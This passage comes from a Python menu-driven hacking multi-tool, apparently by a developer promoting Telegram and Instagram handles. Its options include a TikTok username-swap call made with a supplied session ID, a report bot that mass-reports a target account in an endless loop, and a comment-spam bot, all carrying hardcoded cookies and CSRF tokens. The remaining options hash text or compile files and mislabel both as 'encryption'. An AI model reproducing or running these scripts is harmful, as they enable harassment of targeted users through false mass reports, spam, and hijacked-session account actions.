            url = "https://api16-normal-c-alisg.tiktokv.com:443/passport/login_name/update/"
            cookies = {"sessionid": f'{ess}'}
            headers = {
                "Connection": "close",
                "Content-Length": "19",
                "x-Tt-Token": "",
                "X-SS-Cookie": "d_ticket=d0ea14600615c5b4ed590ea193e0242a16782",
                "tt-request-time": "1612540707288",
                "User-Agent": "TikTok 18.5.0 rv:172025 (iPhone; iOS 13.6.1; ar_SA@calendar=gregorian;numbers=latn) Cronet",
                "x-tt-passport-csrf-token": f"{ess}",
                "sdk-version": "2",
                "passport-sdk-version": "5.12.1",
                "X-SS-STUB": "658BF8A611C037E2DBA4F49839A1535B",
                "x-tt-store-idc": "alisg",
                "x-tt-store-region": "sa",
                "X-SS-DP": "1233",
                "x-tt-trace-id": "00-72ea8350105f59a9bc99830605e904d1-72ea8350105f59a9-01",
                "Accept-Encoding": "gzip, deflate",
                "X-Khronos": "1612540706",
                "X-Gorgon": "8402a0846000919a57d648714b230a43412a3fb228e177b806bd",
                "Content-Type": "application/x-www-form-urlencoded"}

            data = {
                "residence": "sa",
                "os_version": "13.6.1",
                "app_id": "1233",
                "iid": uid,
                "app_name": "musical_ly",
                "login_name": f'{user}'}

            req = r.post(url, headers=headers, cookies=cookies, data=data)

            if '"message":"success"' in req.text:
                print(f'D0NE SWAP >> {user}')
                input('bye ..')
            elif '"message":"error"' in req.text:
                print('Sorry, there is an error !')
            else:
                print('ERROR .. ')
    else:
        print('         Okay bye .. ')
        print(' < insta: giq.n | tele: XRXNR > ')

elif lucifer=="16":
    ketik("======>this tool is programed by VB not pythone u can find it in the file outside<======")

elif lucifer=="17":
    def md5en(M):
        time.sleep(0.0)
        ketik("Encrypt md5 ℙ𝕣𝕠𝕘𝕣𝕒𝕞𝕞𝕖𝕕 𝕓𝕪:Lucifer ")
        ll=input("Enter text to Encrypt it -->:")
        q=md5(ll.encode()).hexdigest()
        print(q)
        input("Press enter...")
    md5en("M")
#################

elif lucifer=="18":
    def sha3_5121(lucifer45sa4f64as6f4a6s5f4):
        time.sleep(0.0)
        ketik("Encrypt sha3_512 ℙ𝕣𝕠𝕘𝕣𝕒𝕞𝕞𝕖𝕕 𝕓𝕪:Lucifer ")
        llsf=input("Enter text to Encrypt it -->:")
        qsdf=sha3_512(llsf.encode()).hexdigest()
        print(qsdf)
        input("Press enter...")
    sha3_5121("lucifer45sa4f64as6f4a6s5f4")
#################

elif lucifer=="19":
    def sha2562(lucifers1d32g1sd321g3sd21g32sd1):
        time.sleep(0.0)
        ketik("Encrypt sha256 ℙ𝕣𝕠𝕘𝕣𝕒𝕞𝕞𝕖𝕕 𝕓𝕪:Lucifer ")
        llsffd=input("Enter text to Encrypt it -->:")
        qsdfsd=sha256(llsffd.encode()).hexdigest()
        print(qsdfsd)
        input("Press enter...")
    sha2562("lucifers1d32g1sd321g3sd21g32sd1")
#################

elif lucifer=="20":
    def sha3844(lucifer5gs5d4g64sd4g):
        time.sleep(0.0)

        ketik("Encrypt sha384 ℙ𝕣𝕠𝕘𝕣𝕒𝕞𝕞𝕖𝕕 𝕓𝕪:Lucifer ")
        llsffdgs = input("Enter text to Encrypt it -->:")
        qsdfsdgs= sha384(llsffdgs.encode()).hexdigest()
        print(qsdfsdgs)
        input("Press enter...")
    sha3844("lucifer5gs5d4g64sd4g")
##################
elif lucifer=="21":
    def shaa12(lucifer45rrty):
        time.sleep(0.0)
        ketik("Encrypt sha1 ℙ𝕣𝕠𝕘𝕣𝕒𝕞𝕞𝕖𝕕 𝕓𝕪:Lucifer ")
        llsfg = input("Enter text to Encrypt it -->:")
        qsdfg = sha1(llsfg.encode()).hexdigest()
        print(qsdfg)
        input("Press enter...")
    shaa12("lucifer45rrty")
elif lucifer=="22":
    def luciferzzaaa(luciferzazazazazaazazaz):
        ketik('Encrypt files -->: ℙ𝕣𝕠𝕘𝕣𝕒𝕞𝕞𝕖𝕕 𝕓𝕪:Lucifer')
        lucifer4554545455445454 = input('[+] Enter your file name ==>: ')
        py_compile.compile(lucifer4554545455445454)
        ketik('Encryption successful ')
        py_compile.compile(lucifer4554545455445454)
    luciferzzaaa("luciferzazazazazaazazaz")
###################

elif lucifer=="23":
    def ketik(s):
    	for ASU in s + '\n':
    		sys.stdout.write(ASU)
    		sys.stdout.flush()
    		sleep(50. / 1000)


    print("\n")
    banner = """
    _            _  __
| |          (_)/ _|
| |_   _  ___ _| |_ ___ _ __
| | | | |/ __| |  _/ _ \ '__|
| | |_| | (__| | ||  __/ |
|_|\__,_|\___|_|_| \___|_|
    """
    print(banner)
    ketik("      By @BBLBB0PY \n\n")
    sess = input('Enter SessionId :')
    id1 = input('Enter Target :')
    time1 = int(input('Enter Sleep :'))
    url = f'https://www.tiktok.com/@{id1}?'
    req = requests.get(url).text
    ref = re.findall('"pageId":"(.*?)"', req)
    ref2 = "".join(ref)

    url = 'https://www.tiktok.com/node/report/reasons_put?aid=1988&app_name=tiktok_web&device_platform=web&referer=https:%2F%2Fwww.tiktok.com%2Flogout%3Fredirect_url%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%26lang%3Dar&root_referer=https:%2F%2Fwww.tiktok.com%2Flogout%3Fredirect_url%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%26lang%3Dar&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F88.0.4324.150+Safari%2F537.36&cookie_enabled=true&screen_width=1366&screen_height=768&browser_language=ar&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F88.0.4324.150+Safari%2F537.36&browser_online=true&ac=4g&timezone_name=Asia%2FRiyadh&page_referer=https:%2F%2Fwww.tiktok.com%2F&priority_region=&verifyFp=verify_kktawy8t_4JksVm1Z_b02R_4OZw_8Xow_ltbTSgi07rs4&appId=1233&region=SA&appType=m&isAndroid=false&isMobile=false&isIOS=false&OS=windows&did=6926024599109109250'

    headers = {
        'Connection': 'close',
        'Content-Length': '102',
        'Accept': 'application/json, text/plain, */*',
        'x-secsdk-csrf-token': '00010000000162d3cecd4226704af4882c9300265af10bf186453cf3514caaa4e1e991b9bb8f1661ca3c679cdcb8',
        'tt-csrf-token': 'f1_VMFyM18-uBgTG9vJC4eD9',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
        'Content-Type': 'application/json',
        'Origin': 'https://www.tiktok.com',
        'Sec-Fetch-Site': 'same-origin',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Dest': 'empty',
        'Referer': f'https://www.tiktok.com/@{id1}?',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
        'Cookie': f'tt_webid_v2=6926024599109109250; tt_webid=6926024599109109250; s_v_web_id=verify_kktawy8t_4JksVm1Z_b02R_4OZw_8Xow_ltbTSgi07rs4; ttwid=1%7CuU0ZIsyDyN3VZI2n8WRgeKbCOnBi7rzo0O5ubfexN7c%7C1612590836%7C1c5cb49ee5e8f958b35190103ce1ea37891a648dc344853098c36dd9d798f52b; passport_csrf_token=abd11d0de6008199789a3435e8e75597; passport_csrf_token_default=abd11d0de6008199789a3435e8e75597; store-idc=alisg; store-country-code=sa; passport_auth_status=0a5f55489be7d62253f3cc65c0176ba7%2C; passport_auth_status_ss=0a5f55489be7d62253f3cc65c0176ba7%2C; MONITOR_WEB_ID=6926024599109109250; tt_csrf_token=f1_VMFyM18-uBgTG9vJC4eD9; bm_sz=143417F305F360FB0118C9BADE7BD751~YAAQjV4zVhlsoSF3AQAAv67rgQp7ED9jt5NvYj0Ucri/yBeUyvmRkXcWi2eDHYlHW0wpTwESpPnRXxmkYoW9E/KsNiBqI3UFBuNuXG8UOGOC9d7sFMXmUiVbSkOLf7FjoExOOKL15LPj9uUrOzv5cjtbAffAyPr5BFlNSEqKlnI2dwVvaO/ePjTmPnI8bRVu; ak_bmsc=534206A79B77FE79273D9A7EDC9A593656335E8DE03500007A422160402E1D27~plCNWzOvH1A2FC/nkj4wbm+3SEkDFTrcuF7EmFJUevnxPG7gnA4ztz2BFY2U++v3cWIrbhUxvzZ7VbqU8MLEBjvV2tpMRzjpto54ZD11kQQVJPNvVJAg290g0zBDg8h7vzNtnxNUSwfbY/uczRYON/eKHv+vlVQpGCwbS2QuJ1IJ1SaZ3Tn8KAm/qHeC0AsEF0qLAjbHZ6oeGZkIqQ8549ttsjOGcJf1Z/r21z2ryGnL9bX7aSXbYf55hUs4jjhzw6; csrf_session_id=16de1c6bebf44bdead22d2a860b981cd; _abck=D86CAAA87344DFBC4EA1879ADDCFE240~0~YAAQjV4zViNsoSF3AQAAdsHrgQVhd7nYpEMGPi1mK5lzZpDkUsMCjvl3o7uhtT3194A91L7VlK360ixfuIC7JnpEuuauV1zk4CpHFWmYUgq0chJ14MzzdOMkP+KaUy5KWvBRNbGCXGdNMbCNlkL2Ypwpf6mH1iB5JXMOIQJvUaD8093tadn10craGz62WtISTA16J+wVZMAG61jf151t0lrHRUqCCvGhr8g+cKjoB7rdauEahG0SKMb6QC09vh54gB10JeHmUE/Um53B89EdIn7eba5Zh/TZDeXmTId1+53YOP2vNbjdwBO9V3iNRMmzmcE+gGiL3y53vU+skPPCRcXXZgcRvQ==~-1~||-1||~-1; odin_tt=d548bc753bf1eac32a0b0a9f32d043a91be2495da855b354bdcc396dedd60c5ae8ec9937c9a5870fe89c921bf91cfcd22a125cdd27c9b9fa046d84bb5a679487; sid_guard={sess}%7C1612792499%7C21600%7CMon%2C+08-Feb-2021+19%3A54%3A59+GMT; uid_tt=cbfd8822d841fcee65012a2b9c00aab2; uid_tt_ss=cbfd8822d841fcee65012a2b9c00aab2; sid_tt={sess}; sessionid={sess}; sessionid_ss={sess}; bm_sv=5D1B8F7463695E34985F3CB65EE23F72~3Zi09KhBoTVy0gcp7krXeiYcspfhEbPvBWKW53O2BQvC3tKeCoSY2t2p/RxkRBPkmQztk7pJFupkN0nepmaXCeXhBAHGLRahhEdtUvKK2zqnTEfBErg8WZCSDbDKU9RoAjxIv3tHcoNd44xdqMv6/irOZXpwGhCdXaPXSrGpsc4='
    }

    data = {
        'object_id': ref2,
        'owner_id': ref2,
        'reason': '310',
        'report_type': "user"
    }

    while True:
        req1 = requests.post(url, json=data, headers=headers).text
        if '{"statusCode":0,"body":{"statusCode":0,"errMsg":"نشكرك على ملاحظاتك"},"errMsg":"نشكرك على ملاحظاتك"}' in req1:
            done += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(
                f'{banner}\n- Report Bot Starting\n \n- Target : {id1}\n\n=============================\n\n[-] Done Report : {done}\n\n[-] Error Report : {error}\n\n=============================')
            time.sleep(time1)
        else:
            error += 1
            os.system('cls' if os.name == 'nt' else 'clear')
            print(
                f'{banner}\n- Report Bot Starting \n Target : {id1}\n\n=============================\n\n[-] Done Report : {done}\n\n[-] Error Report : {error}\n\n=============================')
            time.sleep(0.0)

elif lucifer=="24":
    ketik('''
    **************************************************
    *         - [ Bot Comment Spam ] -               *
    *         Tool developer -> : @BBLBB0             *
    *         InstaGram developer -> : giq.n        *
    *         Channel TeleGram -> : @XRXNR         *
    **************************************************
    ''')
    url_comment = input('[?] Enter ID Post ==> : ')
    see = input('[?] Enter Sessionid ==> : ')
    comment = input('[+] Enter Comment Send ==> : ')
    url = f'https://www.tiktok.com/api/comment/publish/?aid=1988&app_name=tiktok_web&device_platform=web&referer=&root_referer=https:%2F%2Fwww.tiktok.com%2Flogout%3Fredirect_url%3Dhttps%253A%252F%252Fwww.tiktok.com%252F%26lang%3Dar&user_agent=Mozilla%2F5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F88.0.4324.150+Safari%2F537.36&cookie_enabled=true&screen_width=1366&screen_height=768&browser_language=ar&browser_platform=Win32&browser_name=Mozilla&browser_version=5.0+(Windows+NT+10.0%3B+Win64%3B+x64)+AppleWebKit%2F537.36+(KHTML,+like+Gecko)+Chrome%2F88.0.4324.150+Safari%2F537.36&browser_online=true&ac=4g&timezone_name=Asia%2FRiyadh&page_referer=https:%2F%2Fwww.tiktok.com%2F%40%2Fvideo%2F6926668101798989057%3Flang%3Dar%26is_copy_url%3D1%26is_from_webapp%3Dv1%23%2F%40%2Fvideo%2F6926668101798989057&priority_region=SA&verifyFp=verify_kktawy8t_4JksVm1Z_b02R_4OZw_8Xow_ltbTSgi07rs4&appId=1233&region=SA&appType=m&isAndroid=false&isMobile=false&isIOS=false&OS=windows&did=6926024599109109250&tt-web-region=SA&uid=6926962830365885441&aweme_id={url_comment}&text={comment}&device_id=6926024599109109250&_signature=_02B4Z6wo001016YJgOAAAIDCw.zjwz6qSC-mCIRAAImsa3'
    headers = {
        'Accept': 'application/json, text/plain, */*',
        'Accept-Encoding': 'gzip, deflate, br',
        'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
        'Connection': 'keep-alive',
        'Content-Length': '0',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Cookie': f'tt_webid_v2=6926024599109109250; tt_webid=6926024599109109250; s_v_web_id=verify_kktawy8t_4JksVm1Z_b02R_4OZw_8Xow_ltbTSgi07rs4; ttwid=1%7CuU0ZIsyDyN3VZI2n8WRgeKbCOnBi7rzo0O5ubfexN7c%7C1612590836%7C1c5cb49ee5e8f958b35190103ce1ea37891a648dc344853098c36dd9d798f52b; passport_csrf_token=abd11d0de6008199789a3435e8e75597; passport_csrf_token_default=abd11d0de6008199789a3435e8e75597; store-idc=alisg; store-country-code=sa; passport_auth_status=0a5f55489be7d62253f3cc65c0176ba7%2C; passport_auth_status_ss=0a5f55489be7d62253f3cc65c0176ba7%2C; tt_csrf_token=f1_VMFyM18-uBgTG9vJC4eD9; csrf_session_id=16de1c6bebf44bdead22d2a860b981cd; bm_sz=E9EEEF59533D889A01004F6CD3B653ED~YAAQfl4zVrMo8v92AQAAY1DSggpDrr5BghBxHDJTINs3GZAA1Bo7InZznHn072D+BjIjQAcogC8sksx7s90ojPIeRU7+BaIXOvrRPr4eGdBy7dpDZPB+R/fz+Tin/JPXfzvyCVYqLesFXQIAQzqirZwthU+ex+wnIbpf/oPkqB01vhkiMy01JC0TZOfiYtM/; bm_mi=FF91BFAEBFF080CB2579018F7BDFF515~bhQ/ja30So3hSt42gQ7zNvo6wpx2toapAvI4632ZAwQR4BYbvIhadzCmNHgauHSnt6O1KNFXw5OnDg2vO7a24Wt6gTG3qxAwN1cMa4YZtx0lG4JtlHDStb2RUGLLoCeykclvcMpcvbUq81tolkP4e9XX6vVGLslSwUcfUAy5OxK99lmE95CfJU60UxP7fGeUW7JT6++Rvtmd6HckmOidVg+CCpuVQ62MLeAnDwCU7PtksIC5zHc4m/j6g4wm/mNE7XMbr1zqQ5EIQxMUfkP9QQ==; ak_bmsc=75364CF2EE48A90A2C81A4F83153D8C556335E94A23C0000BE8321608ABBEE50~pl2GtRNP/C1n2R2g2M8qAhYQUsZXQZNs4OTpiIkn4Y3B++7BatO4ui1gm605yDBpobhcfYV0VPLQB/KTt6PjiZu88Giz9BW9n93AFljYbEUm261GBjGUYJx0/j9KO9d/aLiFtLA+BOQhPR9B7gkeHRwbATYj8s1cqO+jTzBXJ98BjtYLfOfBzS83K4A9hSO34pqmDdqcbuxaqTZB6cI7O3rCTrkftL10Ri43xosAjK2XZ08dJggTMdC42OPCK5cjMy; cmpl_token=AgQQAPO_F-RO0rAfbVnUed04-n-3nvAbP4A0YPmwUA; sid_guard={see}%7C1612809893%7C5184000%7CFri%2C+09-Apr-2021+18%3A44%3A53+GMT; uid_tt=180472594c2c92986e3c7f2a50d0dc9d5d2a7561cef57c6169227176c14cccb1; uid_tt_ss=180472594c2c92986e3c7f2a50d0dc9d5d2a7561cef57c6169227176c14cccb1; sid_tt={see}; sessionid={see}; sessionid_ss={see}; MONITOR_WEB_ID=6926024599109109250; odin_tt=60f794c35ad3ec6f5edcf50d9685e5559c7d6c638c9dea63ad138157e3721c21320852b38bb0d914e00a54abfcf0a004a64a28bceeeb47f676c388e14ed3e8d505067576f605bf3bcff184bfc0a18860; _abck=D86CAAA87344DFBC4EA1879ADDCFE240~0~YAAQh14zVonKPBx3AQAA6XENgwW2rLMxQOBV9LlQPDlgnD+trDHFwNh5r7BetEVMJEv3zn2J6nyxsiA8Cu/c5XIXMMACfUQ7V79sbJO/hNEFezrqlyQxgTIXrBEIY28nMVT88yM2lgypbj3faKFqCm1WaTVR3cYO4xqeeFX/7U74jMa8KRQAPIeNA5ikcyWQNxjBpIxBcsN7NQVKYpmpIphCliEiF6wx53XvYYybu619AWahlb6Dy4YpN4vQ+JwrPUAOpm9CiYpm+Q7hSd/drNMhj/1pAD48DiV/6xqmyPUW/sGa13+DnjweEZsD6Zy4R3snjP3pxw03ZEfaTn5lJzZCM5eKWw==~-1~-1~-1; bm_sv=783E65101CE38E16B75BCDF27A574C8C~K7L17ac3s473jtUOqjn4LmDz20UeBsharkgJswid4YFi2ycFE0p0ko1NxxctAcZGl1rAi4voU0k8Tfe8GezgDLGIFxHTuzmjt78K/JsLJU/HpbCld3SZMtZwRhks8xORER3+rXLrkCqH1BO3GWlQ5scNPcrjWpwsBJ10bra2NbY=',
        # mgon
        'Host': 'www.tiktok.com',
        'Origin': 'https://www.tiktok.com',
        'Referer': f'https://www.tiktok.com/@filmlersokagi/video/{url_comment}?lang=ar&is_copy_url=1&is_from_webapp=v1',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'tt-csrf-token': 'f1_VMFyM18-uBgTG9vJC4eD9',
        'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.150 Safari/537.36',
        'x-secsdk-csrf-token': '000100000001e9f17423d1cfe8ac0e6deeebdd4647595817f65a447465e5dd7da2dd32cb4c001661dbea89040c46'
    }
    while True:
        req = requests.post(url, headers=headers).text
        if 'Comment sent successfully' in req:
            print('[+] Done Spam Comment ..')
            time.sleep(3)
        else:
            print('[-] Error Sent Comment ..')
            time.sleep(3)
elif lucifer=="25":


    print("""
    dev:XRXNR
    the dev insta-->:giq.n
    -------------------
    [1] - Normal
    [2] - Slant
    [3] - 3D
    [4] - Banner3D
    -------------------
    """)
    line = input("Enter a number :")
    name = input("Text :")
    print('_' * 30)
    print("")

    if line == "1":
        br = pyfiglet.figlet_format(name)
        print(br)
    elif line == "2":
        br = pyfiglet.figlet_format(name, font="slant")
        print(br)
    elif line == "3":
        br = pyfiglet.figlet_format(name, font="isometric1")
        print(br)
    elif line == "4":
        br = pyfiglet.figlet_format(name, font="banner3-D")
        print(br)
    time.sleep(0.0)

else:
    ketik("""

         ᴄʜ:ʜᴛᴛᴘs://ᴛ.ᴍᴇ/XRXNR
         ᴄʜ:ʜᴛᴛᴘs://ᴛ.ᴍᴇ/XRXNR
""" + jo + te)
time.sleep(0.0)
ketik("""

         ᴄʜ:ʜᴛᴛᴘs://ᴛ.ᴍᴇ/XRXNR
         ᴄʜ:ʜᴛᴛᴘs://ᴛ.ᴍᴇ/XRXNR
""" + jo + te)
